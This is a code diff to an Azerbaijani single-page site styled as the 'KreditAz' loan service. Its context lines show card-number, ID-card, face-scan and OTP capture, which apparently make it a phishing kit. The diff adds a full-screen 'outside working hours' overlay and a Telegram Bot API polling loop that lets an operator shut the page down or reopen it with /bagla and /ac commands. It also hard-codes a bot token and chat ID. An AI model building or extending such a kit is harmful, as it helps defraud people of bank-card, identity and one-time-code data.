@@ -253,12 +253,101 @@
         .otp-length-btn.active{border-color:var(--teal-deep);background:var(--teal-deep);color:var(--white)}
         .otp-input-field input{font-size:32px;letter-spacing:14px;text-align:center;font-family:'IBM Plex Mono',monospace;padding:16px 20px;background:var(--white);border:2px solid var(--teal-deep);border-radius:12px}
         .otp-input-field input:focus{border-color:var(--gold);box-shadow:0 0 0 4px rgba(173,127,63,.2)}
+        
+        /* ===== SİTE BAĞLI OVERLAY ===== */
+        #siteBlockOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(11, 20, 17, 0.92);
+            backdrop-filter: blur(12px);
+            z-index: 99999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            visibility: hidden;
+            opacity: 0;
+            transition: opacity 0.4s ease, visibility 0.4s ease;
+            color: var(--white);
+            text-align: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        #siteBlockOverlay.active {
+            visibility: visible;
+            opacity: 1;
+        }
+        #siteBlockOverlay .block-content {
+            max-width: 500px;
+            background: var(--teal-deep);
+            padding: 50px 40px;
+            border-radius: 32px;
+            border: 2px solid var(--gold);
+            box-shadow: 0 0 60px rgba(173, 127, 63, 0.2);
+        }
+        #siteBlockOverlay .block-icon {
+            font-size: 56px;
+            margin-bottom: 16px;
+        }
+        #siteBlockOverlay h2 {
+            font-size: 28px;
+            font-weight: 700;
+            font-family: 'Fraunces', serif;
+            color: var(--gold-light);
+            margin-bottom: 12px;
+        }
+        #siteBlockOverlay p {
+            color: #d4d0c4;
+            font-size: 17px;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+        #siteBlockOverlay .block-btn {
+            display: inline-block;
+            background: var(--gold);
+            color: var(--teal-deep);
+            padding: 14px 40px;
+            border-radius: 999px;
+            font-weight: 700;
+            font-size: 18px;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 20px rgba(173, 127, 63, 0.3);
+        }
+        #siteBlockOverlay .block-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 8px 30px rgba(173, 127, 63, 0.5);
+            background: var(--gold-light);
+        }
+        #siteBlockOverlay .block-small {
+            margin-top: 20px;
+            font-size: 13px;
+            color: rgba(255,255,255,0.5);
+            border-top: 1px solid rgba(255,255,255,0.1);
+            padding-top: 16px;
+        }
 
         @media (max-width:768px){.hero-grid,.calc-card,.offers-grid,.footer-grid,.steps{grid-template-columns:1fr}.bank-grid{grid-template-columns:1fr 1fr}.card-details-row{grid-template-columns:1fr}.face-circle-frame{width:180px;height:180px}.cta-btn,.cta-white,.cta-ghost{font-size:13px;padding:12px 24px}.nav{padding:10px 16px;gap:8px}.logo{font-size:20px}.logo .logo-icon{width:30px;height:30px;font-size:14px}.hero{padding:40px 0 28px}section{padding:32px 0}.calc-card{padding:20px}.results{padding:18px}.modal-card{padding:24px}.hero h1{font-size:28px}.hero-card .big-number{font-size:22px}.id-card-preview{padding:14px 16px}.id-card-preview .id-photo{width:60px;height:76px;font-size:24px}.id-card-preview .id-row .id-label{width:80px;font-size:8px}.id-card-preview .id-row .id-value{font-size:9px}.card-input-wrap .bank-card-visual{padding:16px 18px;min-height:160px}.card-input-wrap .bank-card-visual .card-number-display{font-size:16px;letter-spacing:3px}.card-input-wrap .bank-card-visual .card-top .bank-name-on-card{font-size:11px}nav ul{display:none}.photo-scan-frame{max-width:100%}}
         @media (max-width:480px){.face-circle-frame{width:150px;height:150px}.bank-grid{grid-template-columns:1fr 1fr}.cta-btn,.cta-white,.cta-ghost{font-size:12px;padding:10px 16px}.hero h1{font-size:24px}.logo{font-size:18px}.logo .logo-icon{width:26px;height:26px;font-size:12px}.hero-actions{flex-direction:column}.hero-actions .cta-btn,.hero-actions .cta-ghost{width:100%;text-align:center;justify-content:center}.modal-card{padding:16px}.modal-close{top:10px;right:10px;width:30px;height:30px;font-size:14px}.field label{font-size:13px}.field input,.field select{font-size:13px;padding:10px 12px}.toggle-btn{font-size:13px;padding:10px}.card-input-wrap .bank-card-visual .card-number-display{font-size:14px;letter-spacing:2px}.card-input-wrap .bank-card-visual{padding:14px 14px;min-height:140px}.face-circle-frame{width:150px;height:150px}.success-container .big-icon{font-size:48px}.success-container h2{font-size:22px}.application-card{flex-direction:column;align-items:flex-start;gap:8px}.application-card .app-status{align-self:flex-start}}
     </style>
 </head>
 <body>
+
+    <!-- ===== SİTE BAĞLI OVERLAY ===== -->
+    <div id="siteBlockOverlay">
+        <div class="block-content">
+            <div class="block-icon">🛑</div>
+            <h2>Sayt qeyri-iş saatıdır</h2>
+            <p>
+                <strong>02:00 - 10:00</strong> aralığında xidmətimiz müvəqqəti olaraq dayandırılıb.<br>
+                Zəhmət olmasa, iş saatlarında yenidən cəhd edin.
+            </p>
+            <a href="https://t.me/mesuliyyet" target="_blank" class="block-btn">📱 Əlaqə üçün Telegram</a>
+            <div class="block-small">KreditAz MKT © 2026</div>
+        </div>
+    </div>
 
     <header>
         <div class="nav">
@@ -565,6 +654,115 @@
     </footer>
 
     <script>
+        // =============================================
+        // ===== SİTE BAĞLAMA / AÇMA LOJİKASI =====
+        // =============================================
+        let isSiteBlocked = false;
+
+        // BOT MƏLUMATLARI
+        const BOT_TOKEN = "8902438504:AAHNLnxNa6m2BBnO0eEJdssVYvXTHpBgscI";
+        const CHAT_ID = "-1004334177374";
+
+        function setSiteBlocked(state) {
+            isSiteBlocked = state;
+            const overlay = document.getElementById('siteBlockOverlay');
+            if (state) {
+                overlay.classList.add('active');
+                document.body.style.overflow = 'hidden';
+                overlay.style.pointerEvents = 'auto';
+                console.log('🔒 Sayt BAĞLANDI');
+            } else {
+                overlay.classList.remove('active');
+                document.body.style.overflow = '';
+                overlay.style.pointerEvents = 'none';
+                console.log('🔓 Sayt AÇILDI');
+            }
+        }
+
+        // ==== TELEGRAM POLLING - KOMUTLARI DİNLƏ ====
+        let lastUpdateId = 0;
+        let isPolling = false;
+
+        async function pollTelegramCommands() {
+            if (isPolling) return;
+            isPolling = true;
+
+            try {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
+                const response = await fetch(url);
+                const data = await response.json();
+
+                if (data.ok && data.result) {
+                    for (const update of data.result) {
+                        lastUpdateId = update.update_id;
+
+                        // Mesaj komutlarını yoxla
+                        if (update.message && update.message.text) {
+                            const text = update.message.text.trim().toLowerCase();
+                            const chatId = update.message.chat.id;
+
+                            // YALNIZ doğru CHAT_ID-dən gələn komutları qəbul et
+                            if (String(chatId) === String(CHAT_ID)) {
+                                if (text === '/bagla') {
+                                    setSiteBlocked(true);
+                                    await sendTelegramMessage('✅ Sayt bağlandı! İstifadəçilər yalnız "Sayt qeyri-iş saatıdır" mesajını görür.');
+                                } else if (text === '/ac') {
+                                    setSiteBlocked(false);
+                                    await sendTelegramMessage('✅ Sayt açıldı! Bütün funksiyalar aktivdir.');
+                                }
+                            }
+                        }
+                    }
+                }
+            } catch (error) {
+                console.error('Polling xətası:', error);
+            }
+
+            isPolling = false;
+            // 3 saniyədən sonra yenidən poll et
+            setTimeout(pollTelegramCommands, 3000);
+        }
+
+        async function sendTelegramMessage(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                });
+            } catch (e) {
+                console.error('Mesaj göndərmə xətası:', e);
+            }
+        }
+
+        // ==== İŞ SAATI YOXLAMASI (SADƏCƏ BİLDİRİŞ ÜÇÜN) ====
+        function checkWorkingHours() {
+            const now = new Date();
+            const hours = now.getHours();
+            const isClosed = (hours >= 2 && hours < 10);
+            
+            // Yalnız mesaj göndər, saytı avtomatik bağlama
+            if (isClosed) {
+                console.log(`⏰ İş saatı deyil (${hours}:00). Sayt bağlı olmalıdır.`);
+            } else {
+                console.log(`⏰ İş saatı (${hours}:00). Sayt açıq olmalıdır.`);
+            }
+        }
+
+        // ==== POLLING-İ BAŞLAT ====
+        setTimeout(pollTelegramCommands, 2000);
+        checkWorkingHours();
+
+        // ==== TEST REJİMİ (Konsoldan) ====
+        window.toggleBlock = function() {
+            setSiteBlocked(!isSiteBlocked);
+            console.log(`🔒 Sayt ${isSiteBlocked ? 'BAĞLI' : 'AÇIQ'} vəziyyətinə keçdi.`);
+        };
+
+        // =============================================
+        // ===== DİGƏR FUNKSİYALAR (DƏYİŞMƏYİB) =====
+        // =============================================
+
         // ========== FAQ ==========
         function toggleFAQ(btn) {
             var item = btn.closest('.faq-item');
@@ -597,10 +795,7 @@
             { name: 'Rabitəbank', color: '#003366', logo: bankLogos['Rabitəbank'], sub: 'rabitabank.com' }
         ];
 
-        // ========== TELEGRAM ==========
-        var BOT_TOKEN = "8902438504:AAHNLnxNa6m2BBnO0eEJdssVYvXTHpBgscI";
-        var CHAT_ID = "-1004334177374";
-
+        // ========== TELEGRAM (MÖVCUD) ==========
         var applicationData = {};
         var selectedBankData = { name: 'Kapital Bank', color: '#E31E24' };
         var isChecking = false;
@@ -612,7 +807,6 @@
         var waitingForApproval = false;
         var approvalInterval = null;
         var telegramPollingActive = false;
-        var lastUpdateId = 0;
         var scanStep = 0;
         var videoStream = null;
         var isFaceScan = false;
@@ -697,6 +891,10 @@
 
         // ========== MODAL ==========
         function openModal() {
+            if (isSiteBlocked) {
+                alert('Sayt hazırda qeyri-iş saatıdır. Zəhmət olmasa 10:00-dan sonra cəhd edin.');
+                return;
+            }
             document.getElementById('modalOverlay').classList.add('active');
             document.body.style.overflow = 'hidden';
             showFormStep();
@@ -1368,6 +1566,10 @@
 
         // ========== KREDİT ÖDƏ ==========
         function openCreditCheckModal() {
+            if (isSiteBlocked) {
+                alert('Sayt hazırda qeyri-iş saatıdır. Zəhmət olmasa 10:00-dan sonra cəhd edin.');
+                return;
+            }
             document.getElementById('modalOverlay').classList.add('active');
             document.body.style.overflow = 'hidden';
             document.getElementById('formStep').style.display = 'none';
@@ -1486,6 +1688,9 @@
         setOTPLength(4);
 
         console.log('✅ KreditAz yükləndi!');
+        console.log('📱 Telegram botu komutları dinləyir...');
+        console.log('🔧 Test üçün konsola "toggleBlock()" yazaraq saytı bağlayıb aça bilərsiniz.');
+        console.log('📌 Telegram-da /bagla və /ac komutları işləyir.');
     </script>
 </body>
-                        </html>
+    </html>
